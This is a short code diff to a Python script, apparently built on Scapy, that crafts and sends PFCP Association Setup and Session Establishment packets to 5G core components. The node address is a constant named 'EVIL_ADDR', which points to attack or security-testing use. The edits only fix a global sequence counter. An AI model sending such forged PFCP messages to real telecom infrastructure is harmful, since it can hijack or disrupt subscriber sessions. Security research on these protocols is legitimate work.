@@ -8,7 +8,7 @@ seq=1
 
 
 def send_pfcp_association_setup_req():
-    
+    global seq
     
 
     node_id = IE_NodeId(id_type=0, ipv4=EVIL_ADDR)
@@ -27,6 +27,7 @@ def send_pfcp_association_setup_req():
     print("PFCP Association Setup packet:", packet.show())
     send(packet)
     print(f"PFCP Association Setup packet sent")
+    seq += 1
 
 
 
@@ -81,11 +82,12 @@ def send_pfcp_session_establishment_req():
     print("PFCP Session Establishment packet:", packet.show())
     send(packet)
     print(f"PFCP Session Establishment packet sent")
-    seq +=1
+
 
 
 
 def send_pfcp_session_establishment_test():
+    global seq
     src_ip="10.100.200.66"
     dst_ip="10.100.200.2"
     seid=0xC0FFEE
